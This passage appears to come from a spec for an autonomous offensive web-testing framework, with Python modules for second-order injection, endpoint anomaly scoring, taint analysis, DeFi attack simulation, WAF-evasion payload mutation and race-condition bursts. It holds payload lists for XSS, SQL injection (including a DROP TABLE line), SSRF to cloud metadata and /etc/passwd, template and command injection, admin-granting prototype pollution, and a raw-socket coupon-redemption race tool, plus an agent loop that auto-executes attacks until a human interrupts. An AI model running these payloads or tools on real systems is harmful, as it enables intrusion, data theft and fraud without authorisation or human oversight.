            requests.put(f"{self.base_url}{endpoint}", json=payload,
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
        time.sleep(2)
        self.injection_points.append({
            "endpoint": endpoint,
            "method": method,
            "fields": list(template.keys()),
            "tracking_id": unique,
            "payloads_tested": []
        })

    def hunt_second_order(self, auth_token: str, admin_token: str = None) -> List[Dict]:
        findings = []
        for injection in self.injection_points:
            for field in injection["fields"]:
                for payload_type, payloads in self._payload_library().items():
                    for payload in payloads:
                        self._inject(injection["endpoint"], injection["method"],
                                   field, payload, auth_token)
                        time.sleep(3)
                        for consumer in self.consumption_points:
                            result = self._check_consumption(consumer, payload,
                                                           admin_token or auth_token)
                            if result["triggered"]:
                                findings.append({
                                    "type": f"SECOND_ORDER_{payload_type}",
                                    "storage": injection["endpoint"],
                                    "consumption": consumer,
                                    "field": field,
                                    "payload": payload,
                                    "severity": result["severity"],
                                    "evidence": result["evidence"],
                                    "chain": f"{injection['endpoint']} -> [storage] -> {consumer}"
                                })
        return findings

    def _payload_library(self) -> Dict[str, List[str]]:
        return {
            "XSS": [
                "<img src=x onerror=alert(1)>",
                ""><svg onload=alert(1)>",
                "javascript:alert(1)",
                "${alert(1)}"
            ],
            "SQLI": [
                "1' AND SLEEP(5)--",
                "1' UNION SELECT NULL--",
                "1; DROP TABLE users--",
                "' OR '1'='1"
            ],
            "SSRF": [
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "dict://localhost:11211/",
                "gopher://localhost:6379/_INFO"
            ],
            "SSTI": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}"
            ],
            "COMMAND_INJECTION": [
                "$(id)",
                "`id`",
                "| id",
                "; id #"
            ]
        }

    def _inject(self, endpoint, method, field, payload, token):
        data = {field: payload}
        if method == "POST":
            requests.post(f"{self.base_url}{endpoint}", json=data,
                         headers={"Authorization": f"Bearer {token}"}, timeout=10)
        else:
            requests.put(f"{self.base_url}{endpoint}", json=data,
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)

    def _check_consumption(self, endpoint: str, payload: str, token: str) -> Dict:
        resp = requests.get(f"{self.base_url}{endpoint}",
                          headers={"Authorization": f"Bearer {token}"}, timeout=10)
        result = {"triggered": False, "severity": "INFO", "evidence": ""}
        if payload in ["<img src=x onerror=alert(1)>", ""><svg onload=alert(1)>"]:
            if "onerror=alert(1)" in resp.text or "onload=alert(1)" in resp.text:
                result = {"triggered": True, "severity": "HIGH", "evidence": "XSS triggered in consumption"}
        if "49" in resp.text and ("{{7*7}}" in payload or "${7*7}" in payload):
            result = {"triggered": True, "severity": "CRITICAL", "evidence": "SSTI executed: 7*7=49"}
        return result

# USAGE:
# detector = SecondOrderDetector("https://target.com")
# detector.map_storage_flow("user_token")
# bugs = detector.hunt_second_order("user_token", "admin_token")

```

**Trigger:** `--second-order` or any target with user-generated content / async processing.

---

## Module 4: Weirdness Scorer (`weirdness_scorer.py`)

**Purpose:** Baselines every endpoint's behavior, then finds statistical outliers suggesting hidden functionality, debug endpoints, or unpatched vulnerabilities.

**Hidden bugs caught:** Debug endpoints returning 200, timing differences revealing user enumeration, hidden admin endpoints, endpoints accepting unauthorized mutations.

```python
# weirdness_scorer.py
import requests
import statistics
import json
from collections import defaultdict
from typing import Dict, List
import numpy as np

class WeirdnessScorer:
    """Statistical anomaly detection for web APIs."""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.endpoint_baseline = {}
        self.global_baseline = {}

    def build_baseline(self, endpoints: List[str], token: str = None):
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        for endpoint in endpoints:
            metrics = {
                "status_codes": [],
                "response_times": [],
                "content_lengths": [],
                "header_counts": [],
                "error_keywords": []
            }
            tests = [
                ("GET", True), ("POST", True), ("PUT", True),
                ("GET", False), ("POST", False), ("DELETE", True)
            ]
            for method, authed in tests:
                h = headers if authed else {}
                try:
                    start = time.time()
                    if method == "GET":
                        r = requests.get(f"{self.base_url}{endpoint}", headers=h, timeout=5)
                    elif method == "POST":
                        r = requests.post(f"{self.base_url}{endpoint}", headers=h, json={}, timeout=5)
                    elif method == "PUT":
                        r = requests.put(f"{self.base_url}{endpoint}", headers=h, json={}, timeout=5)
                    else:
                        r = requests.delete(f"{self.base_url}{endpoint}", headers=h, timeout=5)
                    metrics["status_codes"].append(r.status_code)
                    metrics["response_times"].append((time.time() - start) * 1000)
                    metrics["content_lengths"].append(len(r.text))
                    metrics["header_counts"].append(len(r.headers))
                    if r.status_code >= 400:
                        metrics["error_keywords"].append(self._extract_error_type(r))
                except Exception as e:
                    metrics["status_codes"].append(0)
                    metrics["response_times"].append(5000)
            self.endpoint_baseline[endpoint] = metrics

        all_times = [m for ep in self.endpoint_baseline.values() for m in ep["response_times"]]
        all_lengths = [m for ep in self.endpoint_baseline.values() for m in ep["content_lengths"]]
        self.global_baseline = {
            "mean_time": statistics.mean(all_times),
            "std_time": statistics.stdev(all_times) if len(all_times) > 1 else 0,
            "mean_length": statistics.mean(all_lengths),
            "std_length": statistics.stdev(all_lengths) if len(all_lengths) > 1 else 0,
        }
        print(f"[+] Baseline built for {len(endpoints)} endpoints")

    def find_weird_endpoints(self) -> List[Dict]:
        weird = []
        for endpoint, metrics in self.endpoint_baseline.items():
            score = 0
            reasons = []
            avg_time = statistics.mean(metrics["response_times"])
            if self.global_baseline["std_time"] > 0:
                z_time = (avg_time - self.global_baseline["mean_time"]) / self.global_baseline["std_time"]
                if z_time > 2:
                    score += 25
                    reasons.append(f"Response time {avg_time:.0f}ms is {z_time:.1f}σ above mean")
                elif z_time < -1.5:
                    score += 15
                    reasons.append(f"Response time {avg_time:.0f}ms suspiciously fast (static response?)")

            avg_len = statistics.mean(metrics["content_lengths"])
            if self.global_baseline["std_length"] > 0:
                z_len = (avg_len - self.global_baseline["mean_length"]) / self.global_baseline["std_length"]
                if abs(z_len) > 2:
                    score += 20
                    reasons.append(f"Content length {avg_len:.0f}b is {z_len:.1f}σ from mean")

            unique_status = set(metrics["status_codes"])
            if len(unique_status) > 3:
                score += 20
                reasons.append(f"Inconsistent status codes: {unique_status}")

            if 200 in metrics["status_codes"] or 204 in metrics["status_codes"]:
                score += 15
                reasons.append("Accepts mutations without obvious auth validation")

            error_types = set(metrics["error_keywords"])
            if len(error_types) > 2:
                score += 15
                reasons.append(f"Verbose error diversity: {error_types}")

            if score >= 40:
                weird.append({
                    "endpoint": endpoint,
                    "weirdness_score": score,
                    "reasons": reasons,
                    "recommendation": self._recommend_probe(endpoint, reasons),
                    "severity": "HIGH" if score >= 60 else "MEDIUM"
                })
        return sorted(weird, key=lambda x: x["weirdness_score"], reverse=True)

    def _extract_error_type(self, response) -> str:
        text = response.text.lower()
        if "sql" in text or "database" in text:
            return "DB_ERROR"
        elif "stack trace" in text or "traceback" in text:
            return "STACK_TRACE"
        elif "permission" in text or "forbidden" in text:
            return "AUTH_ERROR"
        elif "not found" in text:
            return "NOT_FOUND"
        else:
            return "OTHER_ERROR"

    def _recommend_probe(self, endpoint: str, reasons: List[str]) -> str:
        if any("time" in r for r in reasons):
            return f"Test {endpoint} for time-based SQLi, user enumeration, or conditional auth"
        if any("length" in r for r in reasons):
            return f"Test {endpoint} for IDOR, mass assignment, or data exposure"
        if any("mutation" in r for r in reasons):
            return f"Test {endpoint} for IDOR write/delete, mass assignment"
        return f"Deep manual testing recommended on {endpoint}"

# USAGE:
# scorer = WeirdnessScorer("https://target.com")
# scorer.build_baseline(["/api/users", "/api/admin", "/api/public", "/api/debug"], token="xxx")
# weird = scorer.find_weird_endpoints()

```

**Trigger:** `--weirdness` or any API target.

---

## Module 5: Semantic Taint Tracker (`semantic_taint.py`)

**Purpose:** Static analysis that tracks attacker-controlled input through code to dangerous sinks without passing through validation.

**Hidden bugs caught:** Mass assignment, auth bypass, SQLi, RCE, SSTI, path traversal in source code.

```python
# semantic_taint.py
import ast
import os
import re
from typing import List, Dict, Set, Tuple

class SemanticTaintTracker:
    """Lightweight static taint analysis for Python/JS web apps."""

    SOURCES = [
        "request.json", "request.args", "request.form", "request.headers",
        "request.cookies", "request.files", "request.data", "request.get_json",
        "req.body", "req.query", "req.params", "req.headers", "req.cookies",
        "event.body", "event.queryStringParameters"
    ]

    SINKS = {
        "SQLI": ["execute", "executemany", "raw", "query", "find_by_sql"],
        "RCE": ["eval", "exec", "os.system", "os.popen", "subprocess.call", "subprocess.run"],
        "SSTI": ["render_template", "render", "template.render", "jinja2.Template"],
        "PATH_TRAVERSAL": ["open", "read_file", "send_file", "send_from_directory"],
        "SSRF": ["requests.get", "requests.post", "urllib.request", "curl"],
        "XSS": ["innerHTML", "document.write", "html", "mark_safe"],
        "MASS_ASSIGNMENT": ["create", "update", "save", "insert", "bulk_create"]
    }

    SANITIZERS = [
        "escape", "sanitize", "validate", "clean", "strip_tags", "bleach",
        "htmlspecialchars", "encode", "quote", "param", "bind_param"
    ]

    def __init__(self, codebase_path: str):
        self.codebase = codebase_path
        self.findings = []

    def analyze_file(self, file_path: str):
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                code = f.read()
            if file_path.endswith(".py"):
                tree = ast.parse(code)
                self._analyze_python_ast(tree, file_path, code)
            elif file_path.endswith((".js", ".ts")):
                self._analyze_js(file_path, code)
        except Exception as e:
            pass

    def _analyze_python_ast(self, tree: ast.AST, file_path: str, raw_code: str):
        for node in ast.walk(tree):
            if isinstance(node, ast.FunctionDef):
                func_sources = self._find_sources_in_function(node)
                if not func_sources:
                    continue
                sinks = self._find_sinks_in_function(node)
                for source_var, source_line in func_sources:
                    for sink_type, sink_node, sink_line in sinks:
                        if not self._has_sanitizer_between(node, source_var, sink_node):
                            self.findings.append({
                                "file": file_path,
                                "function": node.name,
                                "source": source_var,
                                "source_line": source_line,
                                "sink_type": sink_type,
                                "sink_line": sink_line,
                                "code_snippet": raw_code.split("\n")[sink_line-1].strip(),
                                "severity": self._severity_for_sink(sink_type),
                                "type": f"TAINT_{sink_type}"
                            })

    def _find_sources_in_function(self, func: ast.FunctionDef) -> List[Tuple[str, int]]:
        sources = []
        for node in ast.walk(func):
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        value_str = ast.dump(node.value)
                        for src in self.SOURCES:
                            if src.replace(".", "") in value_str or src in value_str:
                                sources.append((target.id, node.lineno))
        return sources

    def _find_sinks_in_function(self, func: ast.FunctionDef) -> List[Tuple[str, ast.AST, int]]:
        sinks = []
        for node in ast.walk(func):
            if isinstance(node, ast.Call):
                call_str = ast.dump(node)
                for sink_type, sink_patterns in self.SINKS.items():
                    for pattern in sink_patterns:
                        if pattern in call_str:
                            sinks.append((sink_type, node, node.lineno))
        return sinks

    def _has_sanitizer_between(self, func: ast.FunctionDef, source_var: str, sink_node: ast.AST) -> bool:
        for node in ast.walk(func):
            if isinstance(node, ast.Call):
                call_str = ast.dump(node)
                for san in self.SANITIZERS:
                    if san in call_str and source_var in call_str:
                        return True
        return False

    def _analyze_js(self, file_path: str, code: str):
        lines = code.split("\n")
        for i, line in enumerate(lines, 1):
            for src in ["req.body", "req.query", "req.params", "req.headers", "req.cookies"]:
                if src in line and ("=" in line or "const" in line or "let" in line or "var" in line):
                    var_name = self._extract_js_variable(line)
                    for j in range(i, min(i+20, len(lines))):
                        for sink_type, patterns in self.SINKS.items():
                            for pattern in patterns:
                                if pattern in lines[j] and var_name in lines[j]:
                                    sanitized = any(s in " ".join(lines[i:j]) for s in self.SANITIZERS)
                                    if not sanitized:
                                        self.findings.append({
                                            "file": file_path,
                                            "line": j,
                                            "source": src,
                                            "sink_type": sink_type,
                                            "severity": self._severity_for_sink(sink_type),
                                            "type": f"TAINT_{sink_type}",
                                            "code_snippet": lines[j].strip()
                                        })

    def _extract_js_variable(self, line: str) -> str:
        match = re.search(r"(?:const|let|var)\s+(\w+)", line)
        if match:
            return match.group(1)
        match = re.search(r"(\w+)\s*=", line)
        if match:
            return match.group(1)
        return "unknown"

    def _severity_for_sink(self, sink_type: str) -> str:
        severity_map = {
            "RCE": "CRITICAL", "SQLI": "CRITICAL", "SSRF": "HIGH",
            "SSTI": "HIGH", "XSS": "MEDIUM", "PATH_TRAVERSAL": "HIGH",
            "MASS_ASSIGNMENT": "HIGH"
        }
        return severity_map.get(sink_type, "MEDIUM")

    def scan_codebase(self) -> List[Dict]:
        for root, _, files in os.walk(self.codebase):
            for file in files:
                if file.endswith((".py", ".js", ".ts")):
                    self.analyze_file(os.path.join(root, file))
        return self.findings

# USAGE:
# tracker = SemanticTaintTracker("/path/to/target/app")
# findings = tracker.scan_codebase()

```

**Trigger:** `--semantic-taint` or source code available.

---

## Module 6: Economic Fuzzer (`economic_fuzzer.py`)

**Purpose:** Simulates transaction ordering, flash loans, and oracle manipulation to find MEV-extractable vulnerabilities.

**Hidden bugs caught:** Flash loan sandwich attacks, oracle manipulation with price delay, reentrancy across tokens, governance front-running.

```python
# economic_fuzzer.py
from dataclasses import dataclass
from typing import List, Dict, Callable
import random

@dataclass
class ContractState:
    balances: Dict[str, int]
    total_supply: int
    price_oracle: float
    locked: bool = False

class EconomicFuzzer:
    """Simulates economic attacks against smart contracts."""

    def __init__(self):
        self.attacks = []

    def simulate_flash_loan_attack(self, state: ContractState,
                                   borrow_amount: int,
                                   contract_logic: Callable) -> Dict:
        initial_balance = state.balances.get("attacker", 0)
        state.balances["attacker"] = state.balances.get("attacker", 0) + borrow_amount
        state.balances["flash_pool"] = state.balances.get("flash_pool", 0) - borrow_amount
        original_price = state.price_oracle
        state.price_oracle *= (1 + (borrow_amount / state.total_supply))
        profit = contract_logic(state)
        fee = borrow_amount * 0.0009
        state.balances["attacker"] -= (borrow_amount + fee)
        state.balances["flash_pool"] += (borrow_amount + fee)
        state.price_oracle = original_price
        net_profit = state.balances["attacker"] - initial_balance
        return {
            "attack_type": "FLASH_LOAN_MANIPULATION",
            "borrow_amount": borrow_amount,
            "net_profit": net_profit,
            "viable": net_profit > 0,
            "severity": "CRITICAL" if net_profit > 10000 else "HIGH",
            "steps": [
                f"Flash borrow {borrow_amount}",
                f"Manipulate oracle: {original_price} -> {state.price_oracle}",
                f"Extract profit: {profit}",
                f"Repay {borrow_amount + fee}",
                f"Net profit: {net_profit}"
            ]
        }

    def simulate_sandwich_attack(self, state: ContractState,
                                 victim_tx: Dict,
                                 attacker_reserve: int) -> Dict:
        victim_amount = victim_tx["amount"]
        victim_direction = victim_tx["direction"]
        front_amount = victim_amount * 0.1
        state.price_oracle *= (1 + front_amount / state.total_supply)
        victim_price = state.price_oracle
        victim_received = victim_amount / victim_price
        state.price_oracle *= (1 - front_amount / state.total_supply)
        back_profit = front_amount * (victim_price - state.price_oracle)
        return {
            "attack_type": "SANDWICH_ATTACK",
            "front_run_amount": front_amount,
            "victim_slippage": (victim_price - state.price_oracle) / state.price_oracle,
            "attacker_profit": back_profit,
            "viable": back_profit > 0,
            "severity": "HIGH"
        }

    def find_profitable_attacks(self, state: ContractState,
                               contract_logic: Callable,
                               iterations: int = 100) -> List[Dict]:
        results = []
        for i in range(iterations):
            borrow = random.randint(1000, 1000000)
            result = self.simulate_flash_loan_attack(state, borrow, contract_logic)
            if result["viable"]:
                results.append(result)
        return sorted(results, key=lambda x: x["net_profit"], reverse=True)[:5]

# USAGE:
# state = ContractState(balances={"pool": 1000000, "attacker": 100}, total_supply=1000000, price_oracle=1.0)
# fuzzer = EconomicFuzzer()
# attacks = fuzzer.find_profitable_attacks(state, lambda s: s.balances["attacker"] * 0.1)

```

**Trigger:** `--economic-fuzz` or DeFi/smart contract target.

---

## Module 7: Zero-Context Payload Mutator (`zero_context_mutator.py`)

**Purpose:** Uses semantic analysis to generate novel payloads that bypass semantic WAFs and input validation that pattern-matching tools miss.

**Hidden bugs caught:** Novel WAF bypasses, context-specific XSS, JSON pollution, prototype pollution via unusual paths.

```python
# zero_context_mutator.py
import random
import string
import base64
import urllib.parse
import html

class ZeroContextMutator:
    """Generates context-aware payload mutations that bypass modern validation."""

    ENCODINGS = {
        "url": urllib.parse.quote,
        "double_url": lambda x: urllib.parse.quote(urllib.parse.quote(x)),
        "base64": base64.b64encode,
        "html_entity": lambda x: "".join(f"&#{ord(c)};" for c in x),
        "hex": lambda x: "".join(f"\x{ord(c):02x}" for c in x),
        "unicode": lambda x: "".join(f"\u{ord(c):04x}" for c in x),
        "mixed": lambda x: "".join(random.choice([
            f"%{ord(c):02x}", f"&#{ord(c)};", c
        ]) for c in x)
    }

    def __init__(self):
        self.waf_signatures = set()

    def generate_novel_xss(self, context: str = "html") -> List[str]:
        payloads = []
        if context == "html":
            bases = [
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                ""><script>alert(1)</script>",
                "javascript:alert(1)"
            ]
            for base in bases:
                payloads.append(self._random_case(base))
                payloads.append(self._insert_comments(base))
                payloads.append(self._encode_attributes(base))
                payloads.append(self._homoglyph_replace(base))
                payloads.append(self.ENCODINGS["double_url"](base))
        elif context == "js_string":
            bases = [
                "'-alert(1)-'",
                "';alert(1);//",
                "${alert(1)}",
                "';alert(1);'"
            ]
            for base in bases:
                payloads.append(self._template_literal_bypass(base))
                payloads.append(self._line_continuation_bypass(base))
        return list(set(payloads))

    def generate_json_pollution(self, target_proto: str = "Object") -> List[Dict]:
        return [
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"isAdmin": True}}},
            {"__proto__.isAdmin": True},
            {"__proto__[isAdmin]": True},
            {"__proto__": {"toString": "admin"}},
            {"a": {"__proto__": {"polluted": True}}}
        ]

    def generate_waf_evasion_sqli(self, db_type: str = "mysql") -> List[str]:
        techniques = []
        techniques.append("SE/**/LECT * FROM users")
        techniques.append("SEL%00ECT * FROM users")
        techniques.append("/*!50000SELECT*/ * FROM users")
        techniques.append("SeL%cT * FrOm users")
        techniques.append("1 AND 1=1")
        techniques.append("1 && 1")
        techniques.append("1 OR 1=1")
        techniques.append("1 || 1")
        if db_type == "mysql":
            techniques.append("1 INTO OUTFILE '/tmp/test'")
            techniques.append("LOAD_FILE('/etc/passwd')")
        return techniques

    def _random_case(self, s: str) -> str:
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    def _insert_comments(self, s: str) -> str:
        return s.replace(" ", "<!---->").replace("=", "<!---->=<!---->")

    def _encode_attributes(self, s: str) -> str:
        if "=" in s:
            parts = s.split("=", 1)
            return f"{parts[0]}={urllib.parse.quote(parts[1])}"
        return s

    def _homoglyph_replace(self, s: str) -> str:
        homoglyphs = {
            "a": "а", "e": "е", "o": "о", "p": "р", "c": "с",
        }
        result = ""
        for c in s:
            result += homoglyphs.get(c, c)
        return result

    def _template_literal_bypass(self, s: str) -> str:
        if "'" in s:
            return s.replace("'", "`")
        return s

    def _line_continuation_bypass(self, s: str) -> str:
        return s.replace(" ", "\\\n")

# USAGE:
# mutator = ZeroContextMutator()
# xss_payloads = mutator.generate_novel_xss("js_string")
# pollution = mutator.generate_json_pollution()

```

**Trigger:** `--zero-context` or WAF-protected targets.

---

## Module 8: Ghost State Hunter (`ghost_state_hunter.py`)

**Purpose:** Uses single-packet attacks and statistical timing analysis to find race conditions that normal sequential testing misses.

**Hidden bugs caught:** Double-spend, coupon reuse, inventory overselling, TOCTOU in file operations, user enumeration via timing.

```python
# ghost_state_hunter.py
import requests
import threading
import time
import statistics
from typing import List, Dict
import socket
import ssl

class GhostStateHunter:
    """Advanced race condition detection using parallel request bursts."""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.results = []

    def single_packet_attack(self, endpoint: str, payload: dict,
                            count: int = 20,
                            token: str = None) -> Dict:
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        body = "&".join([f"{k}={v}" for k, v in payload.items()])
        request_lines = []
        for i in range(count):
            req = (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {self.base_url.replace('https://', '').replace('http://', '')}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"{'Authorization: Bearer ' + token + '\r\n' if token else ''}"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            )
            request_lines.append(req)

        host = self.base_url.replace("https://", "").replace("http://", "")
        port = 443 if "https" in self.base_url else 80
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if port == 443:
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.sendall("\r\n".join(request_lines).encode())
            responses = []
            sock.settimeout(10)
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    responses.append(data.decode("utf-8", errors="ignore"))
                except socket.timeout:
                    break
            sock.close()
            success_count = sum(1 for r in responses if "200" in r or "201" in r)
            return {
                "attack_type": "SINGLE_PACKET_RACE",
                "endpoint": endpoint,
                "requests_sent": count,
                "success_responses": success_count,
                "viable": success_count > 1,
                "severity": "CRITICAL" if success_count > 2 else "HIGH",
                "evidence": f"{success_count}/{count} requests succeeded simultaneously"
            }
        except Exception as e:
            return {"error": str(e)}

    def statistical_timing_attack(self, endpoint: str,
                                  payloads: List[dict],
                                  token: str = None,
                                  iterations: int = 50) -> Dict:
        times_valid = []
        times_invalid = []
        for i in range(iterations):
            start = time.time()
            requests.post(f"{self.base_url}{endpoint}",
                         json=payloads[0],
                         headers={"Authorization": f"Bearer {token}"} if token else {},
                         timeout=10)
            times_valid.append((time.time() - start) * 1000)

            start = time.time()
            requests.post(f"{self.base_url}{endpoint}",
                         json=payloads[1],
                         headers={"Authorization": f"Bearer {token}"} if token else {},
                         timeout=10)
            times_invalid.append((time.time() - start) * 1000)

        mean_valid = statistics.mean(times_valid)
        mean_invalid = statistics.mean(times_invalid)
        std_valid = statistics.stdev(times_valid) if len(times_valid) > 1 else 0
        std_invalid = statistics.stdev(times_invalid) if len(times_invalid) > 1 else 0

        if std_valid + std_invalid > 0:
            t_stat = (mean_valid - mean_invalid) / ((std_valid**2/len(times_valid) + std_invalid**2/len(times_invalid))**0.5)
        else:
            t_stat = 0

        significant = abs(t_stat) > 2.5 and abs(mean_valid - mean_invalid) > 5
        return {
            "attack_type": "TIMING_SIDE_CHANNEL",
            "endpoint": endpoint,
            "mean_valid_ms": mean_valid,
            "mean_invalid_ms": mean_invalid,
            "t_statistic": t_stat,
            "significant": significant,
            "severity": "MEDIUM" if significant else "INFO",
            "evidence": f"Timing difference: {abs(mean_valid - mean_invalid):.1f}ms (t={t_stat:.2f})"
        }

# USAGE:
# hunter = GhostStateHunter("https://target.com")
# race = hunter.single_packet_attack("/api/coupon/redeem", {"code": "PROMO2025"}, count=10, token="user_token")
# timing = hunter.statistical_timing_attack("/api/login", payloads=[{"email": "valid@user.com", "password": "wrong"}, {"email": "nonexistent@user.com", "password": "wrong"}], token=None)

```

**Trigger:** `--ghost-state` or financial ops, coupons, inventory targets.

---

## Module 9: The Feedback Oracle (Meta-Learning Engine)

**Purpose:** Closed-loop learning system that updates global knowledge after every test, success or failure.

```python
# feedback_oracle.py
from typing import Dict, List
import time

class FeedbackOracle:
    """Closed-loop learning: every outcome updates the global knowledge base."""

    def __init__(self, knowledge_base_path: str = "references/knowledge.md"):
        self.kb_path = knowledge_base_path
        self.target_profiles = {}
        self.success_patterns = []
        self.anti_patterns = []

    def learn_from_failure(self, target: str, technique: str, reason: str):
        """
        Example: SQLi time-based failed because WAF blocks SLEEP()
        -> Add "SLEEP() blocked" to target profile
        -> Next time, try BENCHMARK() or pg_sleep() or conditional errors
        """
        if target not in self.target_profiles:
            self.target_profiles[target] = {"blocked_techniques": [], "successful_techniques": []}
        self.target_profiles[target]["blocked_techniques"].append({
            "technique": technique,
            "reason": reason,
            "alternative": self._suggest_alternative(technique, reason)
        })
        self.anti_patterns.append({
            "target": target,
            "technique": technique,
            "blocker": reason,
            "timestamp": time.time()
        })
        print(f"[LEARN] {target}: {technique} failed due to {reason}. Alternative: {self._suggest_alternative(technique, reason)}")

    def learn_from_success(self, target: str, technique: str, chain: List[Dict]):
        """
        Example: IDOR found on /api/v2/invoices
        -> Immediately test /api/v2/orders, /api/v2/payments with same pattern
        -> Add to A->B chain database
        """
        self.success_patterns.append({
            "target": target,
            "technique": technique,
            "chain": chain,
            "timestamp": time.time()
        })
        siblings = self._find_sibling_endpoints(target, chain[0]["endpoint"] if chain else "")
        print(f"[LEARN] Success on {target} with {technique}. Sibling endpoints to test: {siblings}")
        return siblings

    def cross_target_transfer(self, source_target: str, bug: Dict, new_targets: List[str]):
        """
        Example: Found email confirmation bypass on Shopify
        -> Auto-generate identical tests for Stripe, Square, BigCommerce
        """
        if bug.get("type") == "EMAIL_CONFIRMATION_BYPASS":
            for platform in new_targets:
                test_plan = {
                    "target": platform,
                    "test_type": "EMAIL_CONFIRMATION_BYPASS",
                    "steps": [
                        "Create account with email A",
                        "Change email to email B",
                        "Verify confirmation link goes to A instead of B",
                        "Check SSO account linking by email"
                    ],
                    "confidence": "HIGH",
                    "reason": f"Same anti-pattern as {source_target} — e-commerce platforms often share auth logic patterns"
                }
                print(f"[TRANSFER] Generated test plan for {platform} from {source_target} pattern")
                yield test_plan

    def _suggest_alternative(self, technique: str, reason: str) -> str:
        alternatives = {
            "SLEEP() blocked": "Try BENCHMARK(), pg_sleep(), conditional errors, or stacked queries",
            "UNION blocked": "Try boolean-based blind, time-based, or error-based extraction",
            "script tag blocked": "Try event handlers, SVG, JS context breakout, or template literals",
            "single quote blocked": "Try numeric payloads, JSON encoding, or comment injection",
        }
        for key, alt in alternatives.items():
            if key.lower() in reason.lower():
                return alt
        return "Try context-specific encoding or alternative syntax"

    def _find_sibling_endpoints(self, target: str, endpoint: str) -> List[str]:
        if "/invoices" in endpoint:
            return [endpoint.replace("invoices", "orders"), endpoint.replace("invoices", "payments")]
        elif "/users" in endpoint:
            return [endpoint.replace("users", "accounts"), endpoint.replace("users", "profiles")]
        return []

# USAGE:
# oracle = FeedbackOracle()
# oracle.learn_from_failure("target.com", "time-based SQLi", "WAF blocks SLEEP()")
# siblings = oracle.learn_from_success("target.com", "IDOR", [{"endpoint": "/api/invoices/123"}])
# tests = list(oracle.cross_target_transfer("shopify", {"type": "EMAIL_CONFIRMATION_BYPASS"}, ["stripe", "square"]))

```

**Integration:** The Feedback Oracle runs silently after every agent execution. It never blocks — it only enriches future hypotheses.

---

## S-Class Orchestration Addendum

### Updated Agent Selection (Turn 3)

When spawning agents in Turn 3, also spawn these based on triggers:

```yaml
additional_agents:
  shadow-logic-agent:
    trigger: "target has user flows, payment logic, or multi-step workflows"
    command: "python3 tools/shadow_logic.py --target {target} --tokens {auth_tokens}"

  patch-gap-agent:
    trigger: "target has public GitHub repo with security-labeled commits"
    command: "python3 tools/patch_gap.py --repo {target_repo} --patch-source hacktivity"

  second-order-agent:
    trigger: "target has user-generated content, file uploads, or async processing"
    command: "python3 tools/second_order_detector.py --target {target} --token {token} --admin-token {admin_token}"

  weirdness-agent:
    trigger: "always (API targets)"
    command: "python3 tools/weirdness_scorer.py --target {target} --endpoints {endpoints} --token {token}"

  semantic-taint-agent:
    trigger: "source code is available"
    command: "python3 tools/semantic_taint.py --codebase {repo_path}"

  ghost-state-agent:
    trigger: "target has coupons, payments, inventory, voting, or withdrawal flows"
    command: "python3 tools/ghost_state_hunter.py --target {target} --endpoint {suspect_endpoint} --token {token}"

  zero-context-agent:
    trigger: "WAF blocks standard payloads or target uses Cloudflare/Akamai"
    command: "python3 tools/zero_context_mutator.py --context {injection_context} --waf-type {detected_waf}"

  economic-fuzzer-agent:
    trigger: "DeFi protocol, smart contract with pricing/oracle logic"
    command: "python3 tools/economic_fuzzer.py --contract {contract_address} --rpc {rpc_url}"
```

### Turn 5 — Autonomous Loop (New)

After Turn 4, if `--autonomous` flag is set:

```
1. FEEDBACK ORACLE ingests all findings from Turn 4
2. For each finding:
   a. If success -> spawn sibling tests (same pattern on related endpoints)
   b. If failure -> update target profile with blocker + alternative techniques
   c. If duplicate -> improve dedup rules for next session
3. HYPOTHESIS GENERATOR creates new attack hypotheses from:
   - Anomalies detected by weirdness-agent
   - Taint flows found by semantic-taint-agent  
   - Patch gaps found by patch-gap-agent
   - Second-order flows mapped by second-order-agent
4. EV CALCULATOR ranks hypotheses by (probability x impact) / effort
5. TOP HYPOTHESIS is auto-executed by the appropriate agent
6. LOOP continues until: max iterations reached, or no high-EV hypotheses remain, or human interrupts
```

### New Mode Flags

| Flag | Trigger | Action |
|------|---------|--------|
| `--shadow-logic` | Any web target | Enable behavioral baseline + anomaly detection |
| `--patch-gap` | Public repo available | Ingest recent security commits, hunt variants |
| `--second-order` | UGC / async target | Map storage->consumption flows |
| `--weirdness` | API target | Build endpoint baseline, find statistical outliers |
| `--semantic-taint` | Source code available | Run static source->sink analysis |
| `--ghost-state` | Financial/logic flows | Single-packet race + timing analysis |
| `--zero-context` | WAF present | Generate novel bypass payloads |
| `--economic-fuzz` | DeFi/smart contract | Simulate flash loans, sandwich attacks |
| `--autonomous` | Any full audit | Enable Turn 5 feedback loop |
| `--all-modules` | "full audit" or no specific mode | Enable ALL S-Class modules |
| `--intelligence` | Enable all 15 Intelligence Agents |
| `--attack-surface` | Deep attack surface mapping |
| `--js-intel` | JavaScript bundle intelligence extraction |
| `--permission-graph` | Build authorization graph |
| `--invariant` | Business rule inference and violation detection |
| `--cross-service` | Microservice data flow tracking |
| `--dangerous-pattern` | Code anti-pattern mining |
| `--exploit-chain` | Automatic chain correlation |
| `--assumption-breaker` | Developer assumption testing |
| `--behavior-diff` | Cross-role/cross-platform behavior comparison |
| `--patch-regression` | Incomplete fix detection |
| `--hypothesis` | AI hypothesis generation |
| `--evidence-correlation` | Multi-source finding correlation |
